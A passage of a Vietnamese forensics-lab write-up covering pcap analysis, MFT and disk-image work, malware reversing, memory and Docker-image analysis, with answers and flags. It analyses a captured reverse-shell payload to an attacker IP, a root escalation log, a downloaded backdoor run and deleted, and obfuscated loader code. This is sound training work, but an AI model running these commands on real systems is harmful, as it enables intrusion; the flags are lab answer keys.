**$\rightarrow$ Đáp án: `P@ssw0rd123456!`** 

#### 6. Can you identify the packet numbers in which the attacker exploited the Remote Code Execution vulnerability to gain access to the system? What was the exact payload used by the attacker?
- FTP chỉ là truy cập ban đầu, RCE thường xảy ra qua HTTP, command injection, reverse shell. Ta lọc `http.request` và `tcp contains "bash"`:

![image](https://hackmd.io/_uploads/BkF2LSZrbl.png)
![image](https://hackmd.io/_uploads/H1FxwSbrbl.png)
- Ở `http.request`, có thể thấy các request `GET /images.php?file=../../../../../../../../etc/passwd` là dấu hiệu của LFI trước khi thực hiện RCE. Bên cạnh đó còn có `/command.php HTTP/1.1`, có thể đoán rằng đây là RCE qua `command.php`.
- TCP Stream hiển thị toàn bộ cuộc hội thoại cho một kết nối TCP cụ thể, click chuột phải vào các packet `/command.php` và chọn `Follow` $\rightarrow$ `TCP Stream`, trong packet `2674` và `2678` có payload:
```
cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.106%2F4444+0%3E%261
```
Nghĩa là `cmd=bash -i >& /dev/tcp/192.168.0.106/4444 0>&1` (URL decode), mà dấu hiệu của RCE trong Reverse Shell là `bash -i >& /dev/tcp/IP/PORT 0>&1`.

**$\rightarrow$ Đáp án: `2674`, `2678`**
```
cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.106%2F4444+0%3E%261
```

#### 7. After gaining access to the system, what does the attacker seem to be doing?
- Ngay sau packet `2678`, ta thấy:

![image](https://hackmd.io/_uploads/SyzuaBbrZg.png)
Nghĩa là Reverse Shell đã kết nối thành công:
    - `55662 → 4444 [PSH, ACK]`
    - `4444 → 55662 [PSH, ACK]`
- Xem TCP Stream của port `4444`:
``` bash
bash: cannot set terminal process group (1125): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w:/var/www/html$ 
whoami

whoami
www-data
www-data@w:/var/www/html$ 
ls -la

ls -la
total 48
drwxr-xr-x 3 www-data www-data 4096 ..........   23 00:09 .
drwxr-xr-x 3 root     root     4096 ..........   11 15:02 ..
-rw-r--r-- 1 www-data www-data 1695 ..........   14 02:34 command.php
-rw-r--r-- 1 www-data www-data  620 ..........   11 19:58 database.sql
-rw-r--r-- 1 root     root       61 ..........   23 03:05 flag.txt
drwxr-xr-x 2 www-data www-data 4096 ..........   13 00:49 images
-rwxr-x--- 1 www-data www-data 2372 ..........   13 00:52 images.php
-rw-r--r-- 1 www-data www-data  612 ..........   11 15:02 index.nginx-debian.html
-rwxr-x--- 1 www-data www-data 1566 ..........   11 20:49 index.php
-rw-r--r-- 1 www-data www-data  636 ..........   11 19:49 sql.sql
-rw-r--r-- 1 www-data www-data 2900 ..........   14 02:34 users.php
-rw-r--r-- 1 www-data www-data  219 ..........   14 02:34 view.php
www-data@w:/var/www/html$ 
cat flag.txt

cat flag.txt
No flag for you. Did you really think it would be this easy?
www-data@w:/var/www/html$ 
su root

su root
Password: 
1amgr000000t!@#$ 
id

su: Authentication failure
www-data@w:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@w:/var/www/html$ 
su root

su root
Password: 
1amgr000000t!@#$
id

uid=0(root) gid=0(root) groups=0(root)

python3 -c "import pty; pty.spawn('/bin/bash');"

root@w:/var/www/html# 
cd ~

cd ~
root@w:~# 
ls -la

ls -la
total 56
drwx------  7 root root 4096 ..........  23 04:27 .
drwxr-xr-x 20 root root 4096 ..........   8 20:40 ..
-rw-------  1 root root 2663 ..........  23 04:27 .bash_history
-rw-r--r--  1 root root 3106 ............ 15  2021 .bashrc
drwx------  5 root root 4096 ..........  16 01:42 .cache
drwxr-xr-x  2 root root 4096 ............ 12 14:22 .cassandra
drwx------  7 root root 4096 ..........  23 04:04 .config
-rw-r--r--  1 root root  133 ..........  23 02:47 gr00t.txt
-rw-------  1 root root   20 ..........  11 17:41 .lesshst
drwxr-xr-x  3 root root 4096 ..........   5 09:30 .local
-rw-------  1 root root  353 ..........  11 19:58 .mysql_history
-rw-r--r--  1 root root  161 ............  9  2019 .profile
drwx------  5 root root 4096 ..........   8 21:09 snap
-rw-r--r--  1 root root    0 ............ 12 14:17 .sudo_as_admin_successful
-rw-r--r--  1 root root  180 ..........  23 04:23 .wget-hsts
root@w:~# 
cat gr00t.txt

cat gr00t.txt
Congrats on getting here. But that's not it, the real test starts now! ;)

Btw, here's your flag for this stage: flag{1_4m_gr00000t!}root@w:~# 
cd /tmp

cd /tmp
root@w:/tmp# 
wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py


<igital-forensics-lab/main/Lab%205/files/backdoor.py
--2023-02-23 04:28:24--  https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1181 (1.2K) [text/plain]
backdoor.py: No such file or directory

Cannot write to ...backdoor.py... (Success).
root@w:/tmp# 
cd ~

cd ~
root@w:~# 
wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py


<igital-forensics-lab/main/Lab%205/files/backdoor.py
--2023-02-23 04:28:29--  https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1181 (1.2K) [text/plain]
Saving to: ...backdoor.py...


backdoor.py           0%[                    ]       0  --.-KB/s               
backdoor.py         100%[===================>]   1.15K  --.-KB/s    in 0s      

2023-02-23 04:28:29 (18.3 MB/s) - ...backdoor.py... saved [1181/1181]

root@w:~# 
python3 backdoor.py &

python3 backdoor.py &
[1] 1190714
root@w:~# Traceback (most recent call last):
  File "/root/backdoor.py", line 54, in <module>
    main()
  File "/root/backdoor.py", line 23, in main
    s.bind((HOST, PORT))
OSError: [Errno 98] Address already in use




[1]+  Exit 1                  python3 backdoor.py
root@w:~# 
netstat -tunlp | grep python

netstat -tunlp | grep python
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1190466/python3     
root@w:~# 
kill 1190466

kill 1190466
root@w:~# 
python3 backdoor.py &

python3 backdoor.py &
[1] 1190745
root@w:~# 
rm backdoor.py

rm backdoor.py
root@w:~#
```
- Có thể thấy rằng sau khi xác nhận user hiện tại (`whoami`, `www-data`), attacker đã kiểm tra và tìm kiếm các file nhạy cảm, sau đó là leo quyền thành công với:
```
su root
Password: 1amgr000000t!@#$
```

#### 8. The attacker read a file from root's home directory. What was in that file?
Lướt tiếp TCP Stream, có thể thấy rằng attacker đã đọc `gr00t.txt` và tìm được flag:
``` bash
root@w:~# 
cat gr00t.txt

cat gr00t.txt
Congrats on getting here. But that's not it, the real test starts now! ;)

Btw, here's your flag for this stage: flag{1_4m_gr00000t!}
```
**$\rightarrow$ Đáp án: `flag{1_4m_gr00000t!}`** 

#### 9. The attacker downloaded a file inside root's home directory. What's the purpose of that file?
Lướt tiếp đoạn cuối của TCP Stream:
``` bash
root@w:~# 
wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py


<igital-forensics-lab/main/Lab%205/files/backdoor.py
--2023-02-23 04:28:29--  https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1181 (1.2K) [text/plain]
Saving to: ...backdoor.py...


backdoor.py           0%[                    ]       0  --.-KB/s               
backdoor.py         100%[===================>]   1.15K  --.-KB/s    in 0s      

2023-02-23 04:28:29 (18.3 MB/s) - ...backdoor.py... saved [1181/1181]

root@w:~# 
python3 backdoor.py &

python3 backdoor.py &
[1] 1190714
root@w:~# Traceback (most recent call last):
  File "/root/backdoor.py", line 54, in <module>
    main()
  File "/root/backdoor.py", line 23, in main
    s.bind((HOST, PORT))
OSError: [Errno 98] Address already in use




[1]+  Exit 1                  python3 backdoor.py
root@w:~# 
netstat -tunlp | grep python

netstat -tunlp | grep python
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1190466/python3     
root@w:~# 
kill 1190466

kill 1190466
root@w:~# 
python3 backdoor.py &

python3 backdoor.py &
[1] 1190745
root@w:~# 
rm backdoor.py

rm backdoor.py
root@w:~# 
```
Có thể thấy rằng attacker đã:
- Tải file `backdoor.py` từ GitHub.
- Chạy backdoor ở chế độ nền bằng `python3 backdoor.py &`: Mở cổng TCP `5555` v lắng nghe kết nối và duy trì quyền truy cập lâu dài để có thể thực thi từ xa.
- Lỗi trong quá trình chạy: `OSError: [Errno 98] Address already in use`:Backdoor cố `bind()` vào một port cố định `5555` nhưng port đó đã có tiến trình khác chiếm nên không thể mở socket $\rightarrow$ Lỗi điển hình khi chạy malware/backdoor nhiều lần.
- Kiểm tra tiến trình chiếm port:

![image](https://hackmd.io/_uploads/ryP_zrzrWg.png)
- Xoá tiến trình `1190466` rồi xoá luôn `backdoor.py` để xoá dấu vết:

![image](https://hackmd.io/_uploads/ByZLQHGBbx.png)
    - Giải phóng port `5555`.
    - Dừng tiến trình đang chạy.
    - Cho phép chạy lại instance mới.

**$\rightarrow$ Đáp án: `Persistence backdoor`** 

#### 10. What information was transmitted through the attacker's covertly established channel of communication?
Qua port Reverse Shell `4444`, backdoor `5555` và HTTP kết nối GitHub, có thể đoán được dữ liệu bị truyền gồm:
- Output command
- `credential.txt`:
```
Leaving my database username and password here in case I forget.

username: myuser
password: P@ssw0rd123456!
```
- Flag: `flag{1_4m_gr00000t!}`

### 6. Lab 06:
> [Link](https://github.com/vonderchild/digital-forensics-lab/tree/main/Lab%2006#analyzing-a-disk-image) lab

**1. What are the MD5 and SHA1 hashes of the `note.txt` file?**
- Ta tìm thấy `note.txt` ở `[root][AD1]`:
![image](https://hackmd.io/_uploads/HJDjaRhLZe.png)
- Chuột phải vào file chọn `Export File Hash List` và lưu file `.csv`:

![image](https://hackmd.io/_uploads/SJ1QRAh8Wl.png)
![image](https://hackmd.io/_uploads/ry-t0A2UWe.png)

**$\rightarrow$ Đáp án:** 
- MD5: `c91e969e9184267c35ddc3ff45f795d3`
- SHA1: `c61dce75ba83f186471297e2e0568ddd0cefe022`

**2. What's the MFT record number of the `note.txt` file? The answer may vary depending on the method used.**
- MFT Record Number là vị trí của metadata của `note.txt` trong Master File Table. Chuột phải rồi `Export Files...`:

![image](https://hackmd.io/_uploads/B1g311a8We.png)
- Chạy lệnh `fsutil file queryfileid <đường_dẫn_file>` trên Command Prompt với quyền admin:

![image](https://hackmd.io/_uploads/Hkchgy68Wx.png)
- Chuyển từ hex về thập phân:

![image](https://hackmd.io/_uploads/Sy5gbkTLZg.png)

**$\rightarrow$ Đáp án: `80220368362590102`**

**3. Can you determine the parent directory of the file named `$Txf`? You can use either `analyzeMFT` or `MFTECmd` to inspect the contents of the `$MFT` file to answer this question.**
- Export `$Txf`:

![image](https://hackmd.io/_uploads/HkwFX1aI-g.png)
- Dùng Commant Prompt admin, `cd` đến thư mục chứa `MFTECmd.exe` rồi chạy lệnh `MFTECmd.exe -f <đường_dẫn_đến_$MFT> --csv <thư_mục_lưu_kết_quả>`:

![image](https://hackmd.io/_uploads/Sk_s8y6I-e.png)
- Mở file `.csv` vừa lưu:

![image](https://hackmd.io/_uploads/SkBCUJpUWl.png)
**$\rightarrow$ Đáp án: `.\$Extend\$RmMetadata`**

**4. The `meme.jpeg` image was originally downloaded from a twitter URL. Can you use MFTECmd to determine the original URL?**
- Cơ chế hoạt động của Alternate Data Streams (ADS): Khi tải file từ trình duyệt trên hệ thống `NTFS`, Windows đính kèm một luồng dữ liệu phụ `:Zone.Identifier` vào file đó. Luồng này chứa thông tin "Mark of the Web" (MoTW) gồm:
    - `ZoneId` (Thường là ba cho Internet).
    - `HostUrl`: Link download.
    - `ReferrerUrl`: Trang web download.
- **Cách 1:** Ở file output `.csv` trên, cột `ZoneIdContents` và dòng chứa `meme.jpeg:Zone.Identifier`:

![image](https://hackmd.io/_uploads/H1D39y68bx.png)
- **Cách 2:** Trong FTK Imager đi đến `[root][AD1]` $\rightarrow$ `meme.jpeg`:

![image](https://hackmd.io/_uploads/ByIHFy6LWx.png)

**$\rightarrow$ Đáp án: `https://pbs.twimg.com/media/FadAHVAUUAAVp2Q?format=jpg&name=small`**

**5. Can you analyze the `$Boot` file and determine the volume serial number in raw hexadecimal format?**
- Volume Serial Number:
    - Xác định chính xác ổ đĩa cụ thể ngay cả khi tên ổ đĩa (Volume Label) bị thay đổi.
    - Liên kết các file shortcut (`.lnk`) hoặc Registry keys với ổ đĩa gốc chúng trỏ tới.
    - Kiểm tra tính nhất quán giữa bản ảnh đĩa (Image) và thiết bị vật lý gốc.
    - **Với NTFS**: Volume Serial Number nằm ở offset 0x48 đến 0x4F (dài 8 bytes).
    - **Với FAT32**: Volume Serial Number nằm ở offset 0x43 đến 0x46 (dài 4 bytes)
- Chuột trái vào `$Boot` rồi quan sát phần Hex, ở hàng `00000040`, offset `0x48` (Cột tám):

![image](https://hackmd.io/_uploads/HkBip1aIWx.png)
    - Raw hex: `7F 7A 42 44 B7 42 44 F6`
    - Cách hiển thị thông thường: `7F7A-4244`
> Dữ liệu trong `$Boot` được lưu theo dạng byte thấp đứng trước (Little Endian).

**$\rightarrow$ Đáp án: `7F 7A 42 44 B7 42 44 F6`**

### 7. Lab 07:
#### Kịch bản:
- Bạn đang làm việc cho một cơ quan tài chính vừa bị tấn công bởi một malware. Rumors cho rằng attacker đã để lại bốn malware khác nhau trên hệ thống, nhưng chỉ có một cái là hàng thật, những cái còn lại làm bạn tốn thời gian.
- May mắn thay, đội phản ứng đầu tiên đã collect toàn bộ bốn malware. Nhiệm vụ của bạn là phân tích mỗi mẫu để trích xuất các thông tin hữu ích về chúng (flag).
- Bốn file cần phân tích ở [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2007/files/tasks).

#### Phân tích cách làm:
- Vào thử link được cho thì ta thấy có bốn file và file `task4` mang đuôi `.py` nên file này đáng nghi nhất:

![image](https://hackmd.io/_uploads/r10oB3o5-x.png)
- Tải từng file về:
``` ubuntu
wget https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2007/files/tasks
```
- Xem loại file vừa tải là gì:

![image](https://hackmd.io/_uploads/ByEAn3icbe.png)
Tất cả đều là file ELF (file thực thi).
- Kiểm tra dung lượng tất cả thì `task4.py` khác biệt nhất:

![image](https://hackmd.io/_uploads/Bk6Sahj9-g.png)
- Thử đọc nội dung `task4.py`:

![image](https://hackmd.io/_uploads/rJF2ThiqWx.png)
- Kiểm tra các file còn lại xem có strings nào con người có thể đọc, thì ở trong `task1`:

![image](https://hackmd.io/_uploads/Hk4-C3iqbe.png)
![image](https://hackmd.io/_uploads/HkBf03oqWl.png)
Có thể thấy flag `flag{s0mH3_susp1cH10us_strH1ng}`, kiểm tra ba file còn lại thì không có flag.
- Mở Cutter để phân tích các file còn lại:
    - `task2`:
      
    ![image](https://hackmd.io/_uploads/rky7eTocbg.png)
    ![image](https://hackmd.io/_uploads/SJoCl6s5Wg.png)
    - `task3`:
      
    ![image](https://hackmd.io/_uploads/S1aHWaoc-e.png)
    - `task4.py`:
      
    ![image](https://hackmd.io/_uploads/ByuYWpscWl.png)
- Ta thấy rằng `task2` khá đáng nghi, lên Gemini tìm hiểu đoạn code có ý nghĩa gì thì được:
  
![image](https://hackmd.io/_uploads/SksVzas5bx.png)
Nghĩa là ta phải chạy file `task2` và nhập lần lượt theo thứ tự các số `23`, `1337`, `252`. Nếu ta nhập đúng như thế thì nó sẽ lấy độ dài của string đã chuẩn bị trong `main` rồi thực hiện tính `s[var_10h] = s[var_10h] ^ (uint8_t)var_24h;`, nghĩa là lấy từng kí tự string ban đầu XOR với 252 (`0xfc`). Sau đó ta sẽ có kết quả cuối cùng là `Decrypted string`. Thực thi `task2`:

![image](https://hackmd.io/_uploads/SyvLQaoqWg.png)
> Đây là kỹ thuật malware **Obfuscated Strings** (công nghệ dùng bởi các ứng dụng độc quyền, mã nguồn đóng để bảo vệ quyền sở hữu trí tuệ, cũng để giấu malware). Thay vì để các string như địa chỉ IP hay command độc hại ở dạng plaintext, malware sẽ giấu dưới dạng một mảng byte lộn xộn và chỉ giải mã ra bộ nhớ sau khi vượt qua các bước test.
- Tiếp tục với `task3`:
  
![image](https://hackmd.io/_uploads/S1aHWaoc-e.png)
    - Nhờ Gemini phân tích đoạn code:
    ![image](https://hackmd.io/_uploads/HyY5v6jqbg.png)
    Nghĩa là ta chỉ cần thực thi `task3`.
    - Chạy thử:
    ![image](https://hackmd.io/_uploads/HJxbd6i5Zl.png)
    Có flag nhưng chỉ hiện ra một nửa.
    - Thử `ltrace`:
    ![image](https://hackmd.io/_uploads/rJjs_ai9-x.png)
    Kết quả vẫn chỉ có một nửa là `flag{r3v3rs2_2n`, vì vòng lặp tối đa 15 lần.
    - Theo [write-up mạng](https://medium.com/@dewa9902/malware-analysis-lab-07-digital-forensics-b9a1227583a7), trong hàm `do_shenanigans()`, ta cần thay đổi `0xf` thành `0x1c`, nhưng ta vẫn không hiểu nó muốn làm gì.
    - Flag trong write-up: `flag{r3v3rs3_3ng1n33r1ng_1z1}`
- Phân tích `task4.py`:
  
    ![image](https://hackmd.io/_uploads/rJF2ThiqWx.png)
    ![image](https://hackmd.io/_uploads/BJPNYpiq-g.png)
    - Thử thay `exec(a)` bằng `print` để xem code:
    ``` py
    from zlib import decompress

    m = "789cad53df739a40107ef7aff08d38cd74ce4330ccb49d395011f911114af1262f781002825845e0f8eb73674cda3cf4ad0f3bc7ee7efbedb7cb6c561eab533ddc45e7449edc0f491527e43c28a33423c3ef43011f56cdce5367e450b4b1fe707161d1467a400dbda889aed05853d54d603b5af9e137a405e6ccad58ac2e120f29866e64440c5a5b5c3d93dec949ee80109efbc43318c601c60ca446bed9dbbd0bec1ebf6c4b57140645d5245c81dd1b14435ca2d2a3a8dd88768b28f29763ab5fe6761be4d8b724d5473dea6725723bc9f603867624ec7680e500729763ecd2de5a5922763dcae210b918a8bad761b891109c5f50493b5c620995c7316e02b4ae41280cd22ae602128d8f505cc83200a6b65aec0e9b82646abb0d9d3e860ac5b32a35b2bda3a5c08c7e6"
    a = "d538e5f7bea0987fb0bd6837c073785a9ed65b692d4d050ba7d5f211bdbfd19f8562915317de17825828164696acd6b84419c9cebec40b9086de979cb42423a987b2630dc59d3a175e3d4c1fab1b357b8d6168fedc17cdcd966f062fb467b8c68fe7b7d694ee69c1e0ba93ff64a7af08d49e823102e3e6a33962b4f2602f60aec78ddb69f530b2a9dbda84938e35bc8abab80a76e0a9f3af999bd93a74e1c33633fa93e5dce354b274d54dc318c1c33633979ca4c61260aa3e1973f69f18d426614b2f4e64f99c1e473ec6f0c7c602fb9b5966f31e643c0bea35b9cb582cae7565cc195e6ff28b87d732c5fc075385673edfc0f35836b535295c7ac48eede2eeceb4e9eb00b635776f72e89d3f1dd4e3fe885d1e85ef876ae4fd921fd21dc0b49971061347a05d05b2f77"

    l = m + a
    w = bytes.fromhex(l)
    decoded_payload = decompress(w)
    print(decoded_payload.decode('utf-8'))
    ```
    ![image](https://hackmd.io/_uploads/ryef9ps5Zl.png)
    - Giải mã các biến trên và thay vào lại:
      
    ![image](https://hackmd.io/_uploads/Bkze7As5Wg.png)
    ``` py
    import base64, codecs

    magic = 'ZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMNCmltcG9ydCBvcw0KDQoNCmtleSA9IGIic3VwM3JfczNjcjN0X2szeSINCmN0ID0gIjRkMzQ0MzZhYmQ3'
    love = 'MzIyZ2ZmAmSyAwR3MwAyATH1LzHjMwVjZTL5BTAzAzDmAQx5MTV2ZmN5ZQx0ZTL0AQH1ZQyzLJL3ZQSyZQx2AQZ0BGSxZ2R5A2EuAmyxZmZ5Amp1ZvVAPt0X'
    god = 'eCA9IGlucHV0KCJFbnRlciBwYXNzd29yZDogIikNCg0KaWYgeCA9PSBrZXkuZGVjb2RlKCk6DQogICAgY2lwaGVyID0gQUVTLm5ldyhrZXk9a2V5LCBtb2Rl'
    destiny = 'CHSSHl5AG0ESK0IQDvxAPvNtVPOxMJZtCFOwnKObMKVhMTIwpayjqPuvrKEypl5zpz9gnTI4XTA0XFxAPvNtVPOipl5mrKA0MJ0bMTIwYzEyL29xMFtcXD0X'
    joy = 'rot13'

    trust_encoded = magic + codecs.decode(love, joy) + god + codecs.decode(destiny, joy)
    final_code = base64.b64decode(trust_encoded).decode('utf-8')
    print(final_code)
    ```
    ![image](https://hackmd.io/_uploads/HJyKspj9Wl.png)
    Nghĩa là ta phải thực thi `task4.py` và điền `sup3r_s3cr3t_k3y`.
    - Chạy `task4`:
      
    ![image](https://hackmd.io/_uploads/r1IQh6j5-l.png)

#### Kết quả:
- `task1`: `flag{s0mH3_susp1cH10us_strH1ng}`
- `task2`: `flag{sup3r_s1mpl3_x0r}`
- `task3.py`: `flag{r3v3rs3_3ng1n33r1ng_1z1}`
- `task4`: `flag{4_m3d10cr3_m4lw4r3_ch4ll3nge}`

### 8. Lab 08:
#### a) Đề bài:
Bạn là một điều tra viên pháp y kỹ thuật số cấp cao làm việc cho một cơ quan tình báo chuyên điều tra tội phạm mạng. Gần đây, họ đã đạt được một bước đột phá lớn trong một vụ án chống lại một băng đảng mã độc tống tiền khét tiếng và đã bắt giữ được một số thành viên của băng đảng, bao gồm cả thủ lĩnh của chúng. Trong quá trình bắt giữ, nhóm điều tra đã thu thập được các bản sao lưu bộ nhớ từ máy tính của từng thành viên trong băng đảng.
Có nghi ngờ rằng thủ lĩnh đang sử dụng Windows 7 vào thời điểm đó và đã giấu một số thông tin bí mật liên quan đến hoạt động của băng đảng trên máy tính của hắn. Là một thành viên cấp cao trong nhóm, cơ quan tình báo đã tin tưởng giao cho bạn bản sao bộ nhớ máy tính của thủ lĩnh và giao nhiệm vụ cho bạn tìm kiếm thông tin bí mật có thể được giấu ở những nơi sau:
- Nó có thể đã được sao chép vào clipboard.
- Nó có thể đã được tìm kiếm trên internet.
- Nó có thể đã được lưu trong một biến môi trường.
- Nó có thể đã được thực thi như một lệnh.
- Nó có thể đã được vẽ bằng MSPaint.
> - Thông tin bí mật cần tìm có dạng flag với định dạng `flag{xxxx}`. Có tổng cộng năm flags cần tìm.
> - Memory dump có thể tải ở: https://drive.google.com/file/d/1Gm7huRq0aa1is1dv0LqJcABcRYlS-Sqn/view?usp=sharing

#### b) Phân tích cách làm:
Ta sẽ dùng Volatility 2 để giải challenge này.
- Nhận diện profile hệ thống bằng Volatility:
![image](https://hackmd.io/_uploads/Bkj1yqu2bl.png)
Có thể thấy profile là `Win7SP1x64`.
- Kiểm tra clipboard:
![image](https://hackmd.io/_uploads/Hkdel9O2We.png)
Flag đầu tiên là `flag{s0m3_stuff_c0p13d_1n_th3_cl1pb0ard}`.
- Kiểm tra lịch sử tìm kiếm Internet:
![image](https://hackmd.io/_uploads/SyyPG9_h-x.png)
![image](https://hackmd.io/_uploads/S1L_z5_2-e.png)
Ta tìm thấy `flag{1nt3rn3t_3xpl0r3r_h1st0ry_1n_m3m0ry_dump}`.
- Kiểm tra biến môi trường:
![image](https://hackmd.io/_uploads/H1k6m9_2Ze.png)
Sau khi lần mò thì ta được flag `flag{3nv1r0nm3nt_v4r14bl3_c4n_4ls0_b3_3xtr4ct3d_fr0m_m3m0ry_dump}`.
- Kiểm tra lệnh đã thực thi:
![image](https://hackmd.io/_uploads/HkfsP5_n-e.png)
Có thể thấy rằng một chuỗi base64 được ghi vào `flag.txt`. Giải mã chuỗi ta được `flag{g00d_0ld_c0ns0l3_h1st0ry}`:
![image](https://hackmd.io/_uploads/BkpRPqOhbl.png)
- Để khôi phục ảnh từ MSPaint, nếu vẽ thông tin bí mật rồi tắt ứng dụng mà không lưu, dữ liệu vẫn có thể nằm trong vùng nhớ của process `mspaint.exe`. Tìm PID rồi dump bộ nhớ ra rồi đọc file:
![image](https://hackmd.io/_uploads/r1klzidh-e.png)
Có thể thấy flag là `flag{h1dd3n_1n_th3_n01s3}`.


#### c) Kết quả:
`flag{s0m3_stuff_c0p13d_1n_th3_cl1pb0ard}`
`flag{1nt3rn3t_3xpl0r3r_h1st0ry_1n_m3m0ry_dump}`
`flag{3nv1r0nm3nt_v4r14bl3_c4n_4ls0_b3_3xtr4ct3d_fr0m_m3m0ry_dump}`
`flag{g00d_0ld_c0ns0l3_h1st0ry}`
`flag{h1dd3n_1n_th3_n01s3}`

### 9. Lab 09:
#### a) Đề bài:
- The container image you will be working with was built using the following Dockerfile:
``` docker
FROM alpine:latest

RUN echo "flag{?????????}" > flag1.txt

COPY flag2-part1.txt flag2-part1.txt

ADD flag2-part2.txt flag2-part2.txt

ENV flag3 flag{?????????}

CMD ["sh", "-c", "echo flag{?????????}"]

# I don't know, this line got corrupted I guess, but I'm sure you'll figure it out
COPY ????????????????????????????????????

# Deleting my secrets, I'm sure nobody will be able to see them now :D
RUN rm flag1.txt flag2-part1.txt flag2-part2.txt
```
- Link download the container image inside the tar archive: https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2009/files/secrets.tar
- It contains a total of five hidden flags needed to find.

#### b) Phân tích cách làm:
- Using `dive` to analyse the container image inside the tar archive. Run these commands below to download and install this tool:
``` ubuntu
wget https://github.com/wagoodman/dive/releases/download/v0.12.0/dive_0.12.0_linux_amd64.deb
sudo apt install ./dive_0.12.0_linux_amd64.deb
```
- Load `.tar` and using `docker images`:
![image](https://hackmd.io/_uploads/BJeCbKi0Wg.)
![image](https://hackmd.io/_uploads/HkCZGFiCbl.png)
- Analyse it by using command `dive <image_id_hoặc_name>`:
![image](https://hackmd.io/_uploads/HkkdxFoR-g.png)
We found the first flag in the second layer: `flag{th1s_w4s_4n_34sy_0n3}`
![image](https://hackmd.io/_uploads/S1VplYoCZe.png)
![image](https://hackmd.io/_uploads/Sk40eYsRWl.png)
![image](https://hackmd.io/_uploads/HJTgbKsAWg.png)
![image](https://hackmd.io/_uploads/Byv7btiRWg.png)
- Initiate the image:
    ``` ubuntu
    docker run -it --name phan_tich_container 27b200a78755 sh
    ```
    Open another Terminal to analyse it and get the container ID and image ID:
    ![image](https://hackmd.io/_uploads/Ska3NtiRZx.png)
    - Analyse the container metadata:
    ![image](https://hackmd.io/_uploads/SyYVSFi0-e.png
    ![image](https://hackmd.io/_uploads/B1bJYts0-x.png)
    And we found the third flag.
    - Check if there has any process existing in the container:
    ![image](https://hackmd.io/_uploads/rJ4TrYiAWg.png)
    - Dump the memory of the process having PID `2420`:
    ![image](https://hackmd.io/_uploads/BJ6c8tjC-x.png)
    - Trying checking for the string `flag` and we have found the third flag too, it is `flag{3nv1r0nm3nt_v4r1abl3s_1ns1d3_c0nta1n3rs}`:
    ![image](https://hackmd.io/_uploads/rJkyDtsAZx.png)
    - Check for the history of the image:
    ![image](https://hackmd.io/_uploads/HJGxdYoCZl.png)
    There are two flags :))) But I have found them before.
- Using `dive` again. At the third layer, I saw a green line (indicatting there is a new file added) having the string `flag2-part1.txt`:
![image](https://hackmd.io/_uploads/Sy1tqKiAZg.png)
In the Layer Details, we have the ID of  third layer is `2336840b6581528adfb39f5a9dcd4ee10297e7cccb3d7b7eada4279cf88d027b`. Exit the `dive` and find which layer containing `flag2-part1.txt`:
![image](https://hackmd.io/_uploads/BJfapKjAWe.png)
- Using `strings` to find the string `flag{`, the result is:
![image](https://hackmd.io/_uploads/S1mW0tjCZl.png)
We have found the first part of second flag. It is `flag{dr34d_1t_run_f0r_1t_`.
> If we pay attention carefully, we can see the fourth flag.
- Using `dive` again. At the fourth player:
![image](https://hackmd.io/_uploads/SJuqCFjAbl.png
Check for folder `78323bfdc56789ddb0df6330bc8e3b641752c27aa594e6ca21d0115dd71090e8` in `secrets.tar`:
![image](https://hackmd.io/_uploads/ByvX1qi0Zl.png)
Extract `layer.tar`:
![image](https://hackmd.io/_uploads/H1Vv1qjA-l.png)
The second part of the second flag is `d3st1ny_4rr1v3s_4ll_7h3_s4m3}`.
- Showing the figuration of the cointainer and filtering the string `Cmd`:
![image](https://hackmd.io/_uploads/Byr0lqsR-g.png)
The fourth flag is `flag{th1s_w4s_4n0th3r_34sy_0n3`.
- Using `dive` again, we can see `secret.txt`:
![image](https://hackmd.io/_uploads/ryMLZciC-g.png)
Extract `78f5e7ff9b9409eaadf09d30285307e4f88f792209ba718b4104bb3767d40fbf` in `secrets.tar`. Then we have a base54 data in `secret.txt`:
    ```
    ZmxhZ3tjMG5ncjR0c18wbl9mMW5kMW5nX3RoM19uMHRfczBfdzNsbF9oMWRkM25fczNjcjN0fQ==
    ```
    The final flag is `flag{c0ngr4ts_0n_f1nd1ng_th3_n0t_s0_w3ll_h1dd3n_s3cr3t}`:
    ![image](https://hackmd.io/_uploads/B1zUM9iRbl.png)

#### c) Kết quả:
`flag{th1s_w4s_4n_34sy_0n3}`
`flag{dr34d_1t_run_f0r_1t_d3st1ny_4rr1v3s_4ll_7h3_s4m3}`
`flag{3nv1r0nm3nt_v4r1abl3s_1ns1d3_c0nta1n3rs}`
`flag{th1s_w4s_4n0th3r_34sy_0n3}`
`flag{c0ngr4ts_0n_f1nd1ng_th3_n0t_s0_w3ll_h1dd3n_s3cr3t}`

### 10. Lab 10:
